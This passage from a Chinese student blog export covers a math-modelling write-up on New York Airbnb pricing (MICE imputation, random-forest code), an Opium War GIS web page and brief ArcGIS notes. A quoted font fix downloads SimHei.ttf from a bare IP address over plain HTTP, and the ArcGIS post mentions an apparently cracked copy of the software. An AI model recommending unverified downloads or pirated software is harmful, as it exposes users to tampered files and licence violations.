    "content": "Intro  清明节献祭了假期，来打建模大赛。第一次打建模，实际上处于一个什么都不会的状态，全靠大语言模型来协助与学习。但是仔细思考过后，我认为自己不应该做一个知识的搬运工，既然搬运都搬运了，那就在这过程中把能学的都学会，不然最后的收获就是零蛋。  抱着这个想法，开始复盘一下这次数学建模的历程，看看能从中学到什么。     2025年北京理工大学数学建模竞赛A题 租房价格    Airbnb 作为全球领先的短租平台，其房源价格受多种因素影响，包括地理位置、房源属性、市场供需关系及房东经营策略等。合理的定价不仅影响房东的收益，也直接关系到房源的入住率和市场竞争力。请基于2024年纽约市 Airbnb 房源数据，针对平台上房源经营与定价问题展开深入研究。    参赛者需基于附件1所给数据，建立数学模型回答如下问题：    对原始数据进行预处理，包括缺失、异常与重复数据的检测与处理，并说明判断缺失、异常的理由以及处理的方法。利用描述性统计分析，定量地呈现数据各指标的分布特性和基本统计规律。针对房源在不同维度上的表现，分析各个细分市场的特征、分布规律及其潜在的经营价值，为制定针对性策略提供理论依据。分析地理位置及其他相关变量对房价、入住率的影响，给出空间自相关性和地理位置的差异对房价、入住率的影响，揭示各因素之间的内在联系。考虑不同细分市场和区域之间的差异性，给出兼顾收益与入住率的最优定价策略。策略实施过程中可能面临哪些风险？请给出相应的改进方向。    附件1中各字段的意义解释：    id：每个房源的唯一标识符，用于区分不同的房源。    name：房源的名称或标题，通常由房东设置，用以描述房源特点或吸引住客。    host_id：房东的唯一标识符，每个房东对应一个 host_id，用来关联同一房东的多个房源。    host_name：房东的名称，有时是昵称或真实姓名，便于识别房东。    neighbourhood_group：较大区域的分组，在纽约市中通常指曼哈顿、布鲁克林、皇后区等大区。    neighbourhood：具体的街区或小区域，标识房源所在的更细致位置。    latitude：房源位置的纬度坐标，用于在地图上定位。    longitude：房源位置的经度坐标，同样用于地理定位。    room_type：房间类型，常见的有整套房源、私人房间和共享房间，反映住客能享受的空间类型。    price：房源每晚的租金价格，通常以美元为单位。    minimum_nights：预订该房源所要求的最少入住夜数。    number_of_reviews：房源累计获得的评价数量，反映住客的反馈记录。    last_review：最近一次评价的日期，表示最近一次住客反馈的时间。    reviews_per_month：平均每月收到的评价数量，可以反映房源的预订活跃度。    calculated_host_listings_count：房东在平台上所发布的房源数量，展示房东的房源管理规模。    availability_365：表示房源在一年中可供预订的天数，用于衡量房源的空置率或使用率。    number_of_reviews_ltm：最近12个月内获得的评价数量，反映近期的预订情况和住客反馈。    license：房源的营业执照或许可号码（若有提供），用于证明房源符合当地的出租规定和法规要求。   首先对赛题进行拆解，个人认为这个赛题十分人性化了，已经把该给到的都给了。最终经过分析，我们队伍把问题拆分成了如下几点：     1-1 对原始数据进行预处理：包括缺失、异常与重复数据的检测与处理    1-2 说明判断缺失、异常的理由以及处理方法    1-3 利用描述性统计分析，定量地呈现数据各指标的分布特性和基本统计规律    2-1 针对房源在不同维度上的表现    2-2 分析各个细分市场的特征、分布规律及其潜在经营价值    2-3 为制定针对性策略提供理论依据    3-1 分析地理位置及其他相关变量对房价、入住率的影响    3-2 给出空间自相关性和地理位置的差异对房价、入住率的影响    3-3 揭示各因素(3-1 &amp; 3-2)之间的内在联系    4-1 考虑(不同细分市场的差异性)和(不同区域之间的差异性)    给出兼顾收益与入住率的最优定价策略    4-2 思考策略实施过程中可能面临的风险,并给出相应的改进方向   之后就开始愉快地工作。首先是数据处理，为了让论文更加的高大上，我们决定来点骚的，看上去厉害的方法。在大语言模型的建议下，我们采用了多重插补法（MICE）对数据进行处理。  Multiple Imputation by Chained Equations     MICE（Multiple Imputation by Chained Equations）是一种基于贝叶斯思想的多重插补技术，用于处理缺失数据。它的基本原理是通过多次迭代，根据已有数据的信息来估计缺失值，并且不断更新估计模型。具体地，MICE将变量分为两类：需要插值的目标变量和其他辅助变量。然后，对于每个目标变量，MICE利用其他辅助变量的信息来进行插值，并不断迭代，直到收敛为止。   从mice到missForest：常用数据插值方法优缺点 - 知乎的3.1部分介绍了这一技术的详细原理。MICE具有灵活性，能够根据数据集的特点进行模型选择和参数调整，同时对于缺失模式的敏感性较低。但在处理非线性关系和大规模数据集时表现一般。这里主要对如何进行MICE进行讨论和研究，以确保这个方法有可复现性。  首先需要导入两个基本的库pandas和numpy，然后使用statsmodels.imputation.mice的mice模块来进行真正的插补操作。  import pandas as pd import numpy as np from statsmodels.imputation.mice import MICEData from sklearn.preprocessing import OrdinalEncoder   由于该算法通常需要数值型输入，其内部模型（如线性回归、决策树等）依赖数值计算，所以还要对非数值内容进行编码，使其变为数值，这里用到了sklearn.preprocessing  # 读取原始数据 raw_data = pd.read_csv('data_FIX.csv') np.random.seed(2024) # ===== 数据预处理阶段 ===== # 1. 保留所有原始字段 data = raw_data.copy()  # 2. 处理时间特征（不删除原列） max_date = pd.to_datetime(data['last_review']).max() data['last_review_days'] = (max_date - pd.to_datetime(data['last_review'])).dt.days data['license'] = data['license'].fillna('UNLICENSED') # 3. 编码分类变量（创建副本列进行编码） geo_encoder = OrdinalEncoder() room_type_encoder = OrdinalEncoder()  # 创建编码副本列 data[['ng_encoded', 'n_encoded']] = geo_encoder.fit_transform(data[['neighbourhood_group', 'neighbourhood']]) data['rt_encoded'] = room_type_encoder.fit_transform(data[['room_type']])   之后开始核心的插补过程。在官方文档中，可以找到每个参数的意义statsmodels.imputation.mice.MICE - statsmodels 0.14.4，文档规定了MICE的代码如下：  class statsmodels.imputation.mice.MICEData(data,             perturbation_method='gaussian',             k_pmm=20,             history_callback=None)                  参数       类型       含义                       data       Pandas ,data ,frame       The data set, which is copied internally.这里是值传递                 perturbation_method       str       The default perturbation method.即默认的扰动模型，这里默认为高斯扰动。另外还可以选择boot模型，                 k_pmm       int       The number of nearest neighbors to use during predictive mean matching. PMM是一种基于模型的数据插补方法，它通过建立预测模型来预测缺失值，并根据预测结果从已有的观察值中选择一个最接近的均值进行匹配。 K_pmm=20表示从预测均值最近的 20 个观测值中随机选择一个作为插补值。                 history_callback       function       规定了是否需要返回操作记录。           # ===== 多重插补实现 ===== # 选择需要插补的数值列 impute_columns = ['price', 'minimum_nights', 'number_of_reviews',                   'reviews_per_month', 'calculated_host_listings_count',                  'availability_365', 'number_of_reviews_ltm', 'last_review_days',                  'ng_encoded', 'n_encoded', 'rt_encoded']  # 执行MICE插补 imp = MICEData(data[impute_columns], perturbation_method='gaussian', k_pmm=5) for _ in range(5):     imp.update_all()  # 合并插补结果 imputed_data = data.copy() imputed_data[impute_columns] = imp.data   然后是后处理阶段。  # ===== 后处理阶段 ===== # 1. 恢复分类变量 imputed_data[['neighbourhood_group', 'neighbourhood']] = geo_encoder.inverse_transform(     imputed_data[['ng_encoded', 'n_encoded']]) imputed_data['room_type'] = room_type_encoder.inverse_transform(     imputed_data[['rt_encoded']]).flatten()  # 2. 恢复last_review日期 imputed_data['last_review'] = np.where(     imputed_data['last_review'].isna(),     (max_date - pd.to_timedelta(imputed_data['last_review_days'], unit='D')).dt.strftime('%Y-%m-%d'),     imputed_data['last_review'] )  # 3. 清理中间列 imputed_data = imputed_data.drop(['ng_encoded', 'n_encoded', 'rt_encoded', 'last_review_days'], axis=1) #价格异常值处理 imputed_data = imputed_data[(imputed_data['price'] &gt; 0) &amp; (imputed_data['price'] &lt; 10000)] # 保存结果 imputed_data.to_csv('imputed_data_FIX_full.csv', index=False)   Matplotlib  最终还有一个绘图，这里用到了matplotlib  # 绘制价格分布对比图 import matplotlib.pyplot as plt  plt.rcParams[\"font.sans-serif\"] = [\"SimHei\"]  # 设置字体 plt.rcParams[\"axes.unicode_minus\"] = False  # 正常显示负号 plt.figure(figsize=(12, 6))  # 原始数据分布 plt.subplot(1, 2, 1) raw_data['price'].hist(bins=50, range=(0, 2500))  # 直接限定数据范围 plt.title(f'原始价格分布 (n={len(raw_data)})') plt.xlabel('Price (USD)') plt.ylabel('frequency') plt.xlim(0, 2500)  # 双重保险设置显示范围[5,7](@ref)  # 插补后数据分布 plt.subplot(1, 2, 2) imputed_data['price'].hist(bins=50, range=(0, 2500)) plt.title(f'插补后价格分布 (n={len(imputed_data)})') plt.xlabel('Price (USD)') plt.xlim(0, 2500)  # 同步设置显示范围  plt.tight_layout()  # 自动调整子图间距 plt.savefig('output_FIX.png', dpi=300, bbox_inches='tight')   这里要特别非常强调一个问题，matplotlib默认的中文绘图需要自己的电脑带有中文字体，否则会出现很多麻烦的问题。  我的环境是Windows11 23H2工作站版下的WSL2 Ubuntu24.02 LTSC，虽然系统已经是中文版，但并不带有中文字体。一开始我在这个问题上折腾了很久。百分百解决你的matplotlib画图中文乱码问题 - 知乎，在这个文档的帮助下，得以解决问题，为了防止原文被删，这里引用一下原文：     解决方案         首先删除你的缓存。找到你的缓存       import matplotlib as mpl print(mpl.get_cachedir()) # /Users/xiewenwen/.matplotlib       我的缓存文件夹是：/Users/xiewenwen/.matplotlib    删除这个缓存文件夹：rm -rf /Users/xiewenwen/.matplotlib/*    有评论说删除缓存就可以了，你也可以试一试。    2.下载SeiHei.ttf字体放入~/.fonts目录下。    或者复制这个链接下载    http://139.199.170.86/downloads/SimHei.ttf       安装SimHei的命令：    （1）cd ~/.fonts 。如果没有就mkdir ~/.fonts （2）wget http://139.199.170.86/downloads/SimHei.ttf （3）安装fc-cache的命令    # 如果你是centos     sudo yum install fontconfig -y    # 如果你是ubuntu    sudo apt-get install fontconfig -y    # 如果你是mac    brew install fontconfig （4）再执行 fc-cache -fv    刷新字体缓存      随机森林  在最后一个问题中，我们使用了随机森林的方法来寻找最优解，随机森林核心参数如下：                 参数       意义       调参建议                       n_estimators       决策树的数量       增加树的数量提升稳定性，但计算成本增加（通常100-500）。                 max_depth       单棵树的最大深度       过大导致过拟合，过小导致欠拟合（常用5-20）。                 min_samples_leaf       叶节点所需最小样本数       增大可防止过拟合（常用1-10）。                 max_features       每棵树分裂时考虑的特征数（默认auto）       减少特征数可降低方差，常用sqrt(n_features)。                 n_jobs       并行计算使用的CPU核心数       设为-1使用全部核心加速训练。           # -*- coding: utf-8 -*- import pandas as pd import numpy as np from sklearn.ensemble import RandomForestRegressor from sklearn.model_selection import train_test_split from sklearn.metrics import r2_score, mean_squared_error from sklearn.preprocessing import OneHotEncoder import matplotlib.pyplot as plt plt.rcParams[\"font.sans-serif\"] = [\"SimHei\"]  # 设置字体 plt.rcParams[\"axes.unicode_minus\"] = False  # 正常显示负号 # -------------------------- # 数据预处理与收益参数计算 # -------------------------- def preprocess_data(filepath):     # 加载数据     df = pd.read_csv(filepath)          # 计算入住率 (Occupancy Rate = 1 - availability_365/365)     df['occupancy_rate'] = 1 - df['availability_365'] / 365          # 定义收益参数     # 曼哈顿成本最高（参数最低），布鲁克林次之，其他区域更高     revenue_param_map = {         'Manhattan':0.374669,         'Brooklyn': 0.510500,         'Queens': 0.470317,         'Bronx': 0.504385,         'Staten Island': 0.500000     }     df['revenue_param'] = df['neighbourhood_group'].map(revenue_param_map)          # 计算收益目标变量 (Revenue = Price * Occupancy Rate * Revenue Parameter)     df['revenue'] = df['price'] * df['occupancy_rate'] * df['revenue_param']          # 特征选择     features = df[[         'neighbourhood_group',  # 大区域分组         'latitude',             # 纬度         'longitude',            # 经度         'room_type',            # 房源类型         'minimum_nights',       # 最少入住天数         'number_of_reviews',    # 累计评价数         'reviews_per_month',    # 每月评价数（反映活跃度）         'calculated_host_listings_count',  # 房东房源总数         'availability_365',     # 可预订天数（用于计算入住率）         'number_of_reviews_ltm',# 近12个月评价数         'price'                 # 原始价格（作为可调节变量）     ]]          # 对分类变量进行独热编码     encoder = OneHotEncoder(sparse_output=False, drop='first')     encoded_cats = encoder.fit_transform(features[['neighbourhood_group', 'room_type']])     encoded_df = pd.DataFrame(         encoded_cats,         columns=encoder.get_feature_names_out(['neighbourhood_group', 'room_type'])     )          # 合并数值型特征     numerical_features = features[[         'latitude', 'longitude', 'minimum_nights',         'number_of_reviews', 'reviews_per_month',         'calculated_host_listings_count', 'number_of_reviews_ltm',         'price'     ]]     processed_features = pd.concat([encoded_df, numerical_features], axis=1)          return df, processed_features, df['revenue']  # -------------------------- # 随机森林建模与评估 # -------------------------- def build_rf_model(features, target):     # 划分训练集和测试集     X_train, X_test, y_train, y_test = train_test_split(         features, target, test_size=0.2, random_state=42     )          # 初始化随机森林模型     model = RandomForestRegressor(         n_estimators=200,         max_depth=10,         min_samples_leaf=5,         random_state=42     )     model.fit(X_train, y_train)          # 模型评估     y_pred = model.predict(X_test)     print(f\"模型性能评估:\")     print(f\"R² Score: {r2_score(y_test, y_pred):.3f}\")     print(f\"RMSE: {np.sqrt(mean_squared_error(y_test, y_pred)):.1f}\")          # 可视化特征重要性     feat_importance = pd.Series(model.feature_importances_, index=features.columns)     feat_importance.nlargest(10).plot(kind='barh', title='特征重要性排名')     plt.savefig('特征重要性排名.png', dpi=300, bbox_inches='tight')          return model  # -------------------------- # 价格优化器 # -------------------------- def optimize_pricing(model, sample_features, original_price, price_range=0.5):     \"\"\"     输入:         - model: 训练好的随机森林模型         - sample_features: 单个房源的特征数据（需包含除price外的所有特征）         - original_price: 当前价格         - price_range: 价格调整范围比例（默认±50%）     输出:         - optimal_price: 最大化收益的最优价格         - max_revenue: 对应的预测收益     \"\"\"     # 生成价格搜索空间（当前价格的50%~150%）     price_min = original_price * (1 - price_range)     price_max = original_price * (1 + price_range)     prices = np.linspace(price_min, price_max, 100)          # 复制特征并调整价格     test_data = pd.DataFrame([sample_features] * len(prices))     test_data['price'] = prices          # 预测收益     revenues = model.predict(test_data)          # 找到最优价格     optimal_idx = np.argmax(revenues)     return prices[optimal_idx], revenues[optimal_idx]  # -------------------------- # 主程序 # -------------------------- if __name__ == \"__main__\":     # 数据预处理     df, features, target = preprocess_data(\"imputed_data_FIX_full.csv\")  # 替换为实际文件路径          # 训练模型     rf_model = build_rf_model(features, target)          # 示例：优化第100号房源价格     sample_idx = 100     sample_data = features.iloc[sample_idx]     current_price = df.iloc[sample_idx]['price']          optimal_price, max_revenue = optimize_pricing(         model=rf_model,         sample_features=sample_data,         original_price=current_price     )          # 打印结果     print(\"\\n=== 价格优化结果 ===\")     print(f\"当前价格: ${current_price:.0f}\")     print(f\"最优价格: ${optimal_price:.0f}\")     print(f\"预测收益提升: {((max_revenue - df.iloc[sample_idx]['revenue']) / df.iloc[sample_idx]['revenue']):.1%}\")          # 可视化价格-收益曲线     price_range = 0.5     prices = np.linspace(current_price * (1 - price_range), current_price * (1 + price_range), 100)     test_data = pd.DataFrame([sample_data] * len(prices))     test_data['price'] = prices      plt.figure(figsize=(10, 6))     plt.plot(prices, rf_model.predict(test_data))     plt.axvline(optimal_price, color='red', linestyle='--')     plt.xlabel(\"Price\")     plt.ylabel(\"Predicted Revenue\")     plt.title(\"价格与收益关系曲线\")     plt.savefig('价格与收益关系曲线.png', dpi=300, bbox_inches='tight')"
  },
  
  {
    "title": "史纲课展示——第一次鸦片战争GIS",
    "url": "/posts/his-gis-sys/",
    "categories": "Blogs",
    "tags": "arcgis, web",
    "date": "2025-03-26 19:20:00 +0800",
    "content": "为了能在史纲课上拿到不错的平时分，我们小组揭榜挂帅选了一个比较有挑战性任务——制作第一次鸦片战争GIS系统。  由于老师希望实现网页端的交互，导致了我们无法使用ArcGIS Pro进行任务，从而转向有qgis2web插件的QGIS。然而好景不长，QGIS的插件不能完全做到所见即所得，虽然其很高端，能够实现炫酷的操作与交互，因而最后我们又回归ArcGIS Pro，最终方案为：ArcGIS生成合适的地图图片，再使用前端工具对图片进行标注。  一、数据选择  虑到我们要制作的GIS是针对1840年的，现有地图显然不能支持我们完成这项任务。哈佛大学的CHGIS v6很好的解决了我们的问题，在其官方数据库下载v6_1820_pref_pgn_utf（市一级行政区边界），v6_1820_pref_pts_utf（市一级行政区中心），v6_1820_prov_pgn_utf（省一级行政区边界），然后将这些包导入到ArcGIS中即可。        需要注意的是，在我使用的ArcGIS中，utf编码的地图会产生乱码，建议下载gbk编码的版本。  二、整体构思  设计思路是将视图分为左右两个板块，左边为地图，右边为文本。  --/ ---index.html ---PaoTai.html  ---/assets  ----/image  ---/misc  ---/scripts ----main.js ----paotai.js  ---/styles ----main.css ----paotai.css   三、框架搭建  为了能够轻便运行，我放弃了VUE、NodeJS、flask等需要服务端的框架，转而使用轻量级的html+js+css完成网页搭建。  感谢伟大的大语言模型deepseek的大力支持，让我在一周不到的时间里完成这个项目。  在index.html中，我们首先对网页视图进行简单划分区域：  &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt;     &lt;meta charset=\"UTF-8\"&gt;     &lt;title&gt;第一次鸦片战争动态展示&lt;/title&gt;     &lt;link rel=\"stylesheet\" href=\"styles/main.css\"&gt; &lt;/head&gt; &lt;body&gt;     &lt;div class=\"container\"&gt;         &lt;div class=\"map-container\"&gt;                     &lt;/div&gt;          &lt;div class=\"info-panel\"&gt;                     &lt;/div&gt;      &lt;script src=\"scripts/data.js\"&gt;&lt;/script&gt;     &lt;script src=\"scripts/main.js\"&gt;&lt;/script&gt;     &lt;/div&gt;  &lt;/body&gt; &lt;/html&gt;   可以看到在container中，我把视图分为两个区域：map-containe和info-panel，前者负责展示地图和实现交互操作，后者负责展示内容。  内容很好生成，只需要把想要放进去的文本交给大语言模型，让其转化为html即可：  &lt;div class=\"info-panel\"&gt;             &lt;h1&gt;第一次鸦片战争&lt;/h1&gt;                      &lt;div class=\"history-article\"&gt;                 &lt;img src=\"https://b0.bdstatic.com/ugc/VD9q43Rh9rv2_28-4BKoTQb756ae0e7ac773ee593fb8c2e0545a07.jpg@h_1280\" alt=\"鸦片战争形势图\" class=\"article-main-img\"&gt;                 &lt;div class=\"article-section\"&gt;                     &lt;h2&gt;1. 战前准备：&lt;/h2&gt;                     &lt;h3&gt;背景：&lt;/h3&gt;                     &lt;p&gt;（1）中英贸易体制冲突：&lt;/p&gt;                     &lt;p&gt;英国不断开拓海外市场，倾销商品。清政府通过行商制度垄断对外贸易，英国贸易受限。1834年英国派律劳卑任商务监督，试图突破行商体系直接交涉。律劳卑以非“禀”格式信件致广州高官，遭清政府拒绝，卢坤总督还发布命令，要求英商活动后立即返澳门。此事件凸显中英在外交文书格式、官方接触方式上的矛盾，英国对既有贸易体制的不满进一步加剧。&lt;/p&gt;                              ......             &lt;/div&gt;                      &lt;div class=\"history-article\"&gt;                 ......             &lt;/div&gt;         &lt;/div&gt;   左侧的地图就更加简单，直接添加图片即可：  &lt;div class=\"map-container\"&gt;             &lt;!-- &lt;div class=\"map-image\" id=\"warMap\"&gt;&lt;/div&gt; --&gt;             &lt;div class=\"map-image\"&gt;                 &lt;!-- 添加img标签以获取实际渲染尺寸 --&gt;                 &lt;img src=\"assets/images/qing-dynasty-map.jpg\"                       alt=\"历史地图\"                       style=\"width: 100%; height: auto; opacity: 0;\"&gt;              &lt;/div&gt;         &lt;/div&gt;   如此，基本的网页框架就搭建完毕了。  四、细节实现  （一）样式设计  在styles/main.css中来实现具体的样式，首先对网页大体进行设计：  body {     margin: 0;     font-family: 'Microsoft YaHei', sans-serif; }  .container {     display: flex;     height: 100vh; }  .map-container {     flex: 6.5;     position: relative;     background: #f0f0f0; }  .map-image {     position: relative;  /* 关键定位设置 */     width: 100%;     height: 90vh;     background: url('../assets/images/qing-dynasty-map.jpg') no-repeat center/contain; }  .info-panel {     flex: 3.5;     padding: 20px;     overflow-y: auto;     background: #fff;     box-shadow: -2px 0 5px rgba(0,0,0,0.1); }   在map-container和info-panel中分别定义flex属性，使其做到6.5:3.5的视图占比，紧接着设计一下背景颜色和阴影部分。  之后实现info-panel中多样化的字体样式与图文混排：  .history-article {     padding: 20px;     line-height: 1.8; }  .info-panel {     flex: 3.5;     padding: 20px;     overflow-y: auto;     background: #fff;     box-shadow: -2px 0 5px rgba(0,0,0,0.1); }  .info-panel h1 {     text-align: center;     font-size: 2.2em;     color: #2c3e50;     margin-bottom: 25px;     border-bottom: 3px solid #3498db;     padding-bottom: 15px; }  .article-section h2 {     color: #34495e;     font-size: 1.3em;     margin: 25px 0 15px;     padding-left: 10px;     border-left: 4px solid #e74c3c; }  /* 图文混排 */ .article-main-img {     width: 100%;     border-radius: 8px;     margin: 15px 0;     box-shadow: 0 2px 5px rgba(0,0,0,0.1); }  .article-sub-img {     width: 90%;     margin: 15px auto;     display: block;     border: 1px solid #ddd; }   （二）鼠标悬停信息展示交互  为了可视化地展示第一次鸦片战争中一些关键战役点的信息，我们要在地图上绘制一些可交互的点，这需要依靠JavaScript。  在main.js中，实现这个功能；而在data.js中，存储着需要画图的信息。  // data.js const warEvents = [     {         id: 1,         title: \"虎门销烟\",         position: { x: \"42%\", y: \"73%\" },         color: \"#e74c3c\",         time: \"1839年6月3日-25日\",         url: \"\",         significance: `林则徐在东莞虎门海滩当众销毁鸦片237万斤，历时23天。这是清政府首次大规模禁烟行动，直接导致中英贸易冲突升级[6] 。`     },     {         id: 2,         title: \"林维喜案\",         position: { x: \"45%\", y: \"75%\" },         color: \"#f1c40f\",         time: \"1839年7月7日\",         url: \"\",         significance: `英国水手在九龙尖沙咀打死村民林维喜，成为中英司法冲突的导火索。该事件暴露领事裁判权问题，加速战争爆发[6] 。`     },     {         id: 3,         title: \"定海战役\",         position: { x: \"60%\", y: \"52%\" },         color: \"#2ecc71\",         time: \"1840年7月5日-6日\",         url: \"\",         significance: `英军首次攻占中国沿海城市，标志战争从广东扩展到江浙。清军26人阵亡，知县姚怀祥投水殉国[6] 。\\n英军占据舟山后的疾病蔓延、人员被擒及谈判博弈。英军占领舟山后，因食物不足、卫生条件差，疾病（间歇热、痢疾）肆虐。士兵住城外营地，大米质量差，腌肉减量，医院设于潮湿稻田旁，康复困难。9月初，马德拉斯炮兵安突德上尉调查时被中方人员抓获，押往宁波，关入木笼。9月15日，“风鸢”号搁浅遭中方炮击，副航海长吉布生等被抓押至宁波，部分船员被小船接走。“康威”号、“阿尔吉林”号活动中，“康威”号船员患坏血病，“阿尔吉林”号遭炮台炮击，梅森上尉指挥回击。伯麦爵士就安突德被抓致信中方未果。10月英军回舟山，得知情况后谈判，中方承诺宽大处理俘虏，英军后续撤离舟山。英军因疾病、补给问题战力下降，清政府通过抓获英军在谈判中占据主动，促使英军寻求谈判，为后续停战协议奠定基础。此阶段暴露英军占领舟山后的统治困境，也体现清政府局部抵抗与外交博弈策略。`     },     {         id: 4,         title: \"大沽口谈判\",         position: { x: \"52%\", y: \"18%\" },         color: \"#9b59b6\",         time: \"1840年8月\",         url: \"\",         significance: `第一次鸦片战争期间仅有少量老式炮台（约60门炮），未形成有效防御。英军于1840年8月抵大沽口威胁清廷，迫使道光帝求和，清政府首次与英方正式谈判。暴露清廷对海防认知的严重不足[6] 。`     },     {         id: 5,         title: \"虎门战役\",         position: { x: \"41%\", y: \"75%\" },         color: \"#e74c3c\",         time: \"1841年1月7日\",         url: \"./PaoTai.html\",         significance: `英军使用蒸汽战舰侧翼包抄战术，清军传统炮台失效。水师提督关天培殉国，舰船损失比11:0[6] 。`     },     {         id: 6,         title: \"三元里抗英\",         position: { x: \"45%\", y: \"71%\" },         color: \"#3498db\",         time: \"1841年5月30日\",         url: \"\",         significance: `民间自发抗英最大规模战斗，利用暴雨使英军燧发枪失效，毙伤敌72人。展现民众抵抗意志[6] 。`     },     {         id: 7,         title: \"南京条约签订\",         position: { x: \"58%\", y: \"40%\" },         color: \"#e67e22\",         time: \"1842年8月29日\",         url: \"\",         significance: `中国近代第一个不平等条约，主要内容：割让香港岛、赔款2100万银元、五口通商。标志战争正式结束[6] 。`     },     {         id: 8,         title: \"厦门之战\",         position: { x: \"52.5%\", y: \"68%\" },         color: \"#e67e99\",         time: \"1840年7月\",         url: \"\",         significance: `地势与防御：厦门坐落在厦门岛南岸，与鼓浪屿隔海峡相望，海峡两侧地势高，厦门城南山峦为天然屏障，沿岸及鼓浪屿遍布炮台，防御工事较坚固。 战斗细节：英军“布朗底”号等舰船进犯厦门，中方炮台反击。但英军舰船机动性强，武器先进，持续炮击摧毁厦门部分炮台。清军虽依托工事抵抗，终因武器差距（英军步枪射程、射速占优）失利，厦门部分区域被占领。此役展现英军沿海进攻态势，扩大战争范围。`     } ];   这些机械性内容完全可以交由大语言模型来帮忙填充。需要注意的是，这里的position是我个人手动调整的，在我的电脑上能够完美对应地图上的点，但是在别的尺寸的屏幕上会有偏移，具体原因会在后文提到。  这一段交由大语言模型实现：  function createInfoWindow() {     const infoWindow = document.createElement('div');     infoWindow.id = 'event-info';     infoWindow.style.cssText = `         position: fixed;         background: rgba(255,255,255,0.96);         padding: 12px;         border-radius: 6px;         box-shadow: 0 4px 12px rgba(0,0,0,0.15);         max-width: 280px;         pointer-events: none;         opacity: 0;         transition: opacity 0.2s, transform 0.2s;         z-index: 9999;         font-family: 'Microsoft YaHei', sans-serif;     `;     document.body.appendChild(infoWindow);     return infoWindow; }  const infoWindow = createInfoWindow();  // 信息窗显示逻辑 function showEventInfo(event, marker) {     const rect = marker.getBoundingClientRect();     const scrollY = window.scrollY || document.documentElement.scrollTop;          infoWindow.innerHTML = `         &lt;div style=\"border-bottom: 1px solid #eee; margin-bottom:8px; padding-bottom:4px;\"&gt;             &lt;strong style=\"font-size:16px; color:#2c3e50;\"&gt;${event.title}&lt;/strong&gt;         &lt;/div&gt;         &lt;div style=\"font-size:13px; color:#666;\"&gt;             &lt;div style=\"margin-bottom:6px;\"&gt;🕒 ${event.time}&lt;/div&gt;             &lt;div&gt;${event.significance}&lt;/div&gt;         &lt;/div&gt;     `;      // 动态计算位置防止溢出     const windowWidth = window.innerWidth;     let posLeft = rect.left + rect.width/2;     if(posLeft &gt; windowWidth - 300) posLeft = windowWidth - 300;          infoWindow.style.left = `${posLeft}px`;     infoWindow.style.top = `${rect.top + scrollY + 24}px`;     infoWindow.style.opacity = '1'; }   首先实现动态绘图，依照data.js的内容，定义一个展示框及其样式。  然后实现动态绘图：  // 增强版标记初始化 // 修改后的标记初始化函数（保留悬停提示，增加点击跳转） function initMapMarkers() {     const mapContainer = document.querySelector('.map-image');          mapContainer.querySelectorAll('.event-marker').forEach(marker =&gt; marker.remove());          warEvents.forEach(event =&gt; {         const marker = document.createElement('div');         marker.className = 'event-marker';         marker.style.cssText = `             left: ${event.position.x};             top: ${event.position.y};             background-color: ${event.color};             position: absolute;             width: 18px;             height: 18px;             border-radius: 50%;             transform: translate(-50%, -50%);             cursor: ${event.url ? 'pointer' : 'default'};             transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);             box-shadow: 0 2px 4px rgba(0,0,0,0.2);         `;         marker.dataset.eventId = event.id;          // 保留悬停显示信息窗功能         marker.addEventListener('mouseenter', () =&gt; {             showEventInfo(event, marker);             marker.style.transform = 'translate(-50%, -50%) scale(2)';         });          marker.addEventListener('mouseleave', () =&gt; {             infoWindow.style.opacity = '0';             marker.style.transform = 'translate(-50%, -50%) scale(1)';         });          // 点击跳转逻辑         marker.addEventListener('click', () =&gt; {             if(event.url) {                 // 新标签页打开（保留当前页面状态）                 window.open(event.url, '_blank');             }         });          mapContainer.appendChild(marker);     }); }   // 统一初始化 function initializeApp() {     const mapContainer = document.querySelector('.map-image');     initMapMarkers(); }  // 启动应用 document.addEventListener('DOMContentLoaded', initializeApp);   到此，网站的绝大部分内容就实现了。  （三）鸦片战争动态展示  为了实现鸦片战争的动态展示，一开始我希望也通过JavaScript来实现，但是在咨询过淘宝的外包人员以后，得到的答复是比较难实现（要加钱），因而我也没有办法在一周内就实现这样的效果。  但是人生就是一场面向结果的编程，只要能实现结果，可以不考虑过程。  如何将鸦片战争的动态展示转移到我的舒适圈？于是我脑洞大开，仔细一想，如果能使用PPT自带的平滑过渡效果，就能很快实现这个功能，那么接下来我的任务实际上就是：用PPT绘制鸦片战争动态过程，然后把其转化为网页元素。  前者十分好实现，Office也算是老朋友了，不到十分钟结束战斗。但问题是如何把PPT转化为可交互的网页元素。直接另存为html显然不可行，我的核心诉求就是保留ppt的平滑过度效果。天不亡我，我找到了课件制作软件_交互式课件_scorm课件_iSpring Suite官方正版，借助这个强大的工具，可以将带动画的ppt以web形式发布，解决了我的痛点（14天的试用期在ddl为7天的时候显得苍白无力）。  接下来我直接把生成的文件放到/misc目录下，然后在index.html中添加一个指向它的按钮就可以完美实现我的需求：  &lt;a href=\"misc/index.html\"  class=\"control-btn\"  target=\"_blank\"&gt;播放战争进程&lt;/a&gt;   之后实现一下对应的css样式就可以完美结束战斗：  .control-btn {     position: absolute;     bottom: 20px;     left: 50%;     transform: translateX(-50%);     padding: 10px 30px;     background: #3498db;     color: white;     border: none;     border-radius: 5px;     cursor: pointer;     transition: background 0.3s; }  .control-btn:hover {     background: #2980b9; }"
  },
  
  {
    "title": "记一次ArcGIS学习与操作",
    "url": "/posts/arcgis/",
    "categories": "Blogs",
    "tags": "blogs, arcgis",
    "date": "2025-03-11 18:45:00 +0800",
    "content": "由于思政课需要我们制作一套关于第一次鸦片战争的地理GIS（其实是为了凑满平时分），我们选择了ArcGIS来完成这一项工作。  一、软件安装  在某宝通过神秘方法找到慈禧付费版ArcGIS Pro 3.4.2后，根据安装教程顺利进行安装。这个版本的ArcGIS有汉语版，十分优秀。  二、数据搜索  考虑到我们要制作的GIS是针对1840年的，现有地图显然不能支持我们完成这项任务。哈佛大学的CHGIS v6很好的解决了我们的问题，在其官方数据库下载v6_1820_pref_pgn_utf（市一级行政区边界），v6_1820_pref_pts_utf（市一级行政区中心），v6_1820_prov_pgn_utf（省一级行政区边界），然后将这些包导入到ArcGIS中即可。        接下来要将一些数据插入：  在右侧目录视图中，找到数据库目录，进入后发现一个xx.gdb，右键新建要素类，然后按照需求创建数据库的表头即可。  我选择了“点”类型，包含“名称”、“经度”、“纬度”、“时间”、“参战方”、“伤亡人数”、“历史影响”，“备注”来包含第一次鸦片战争相关的位置信息。"
  },
  
  {
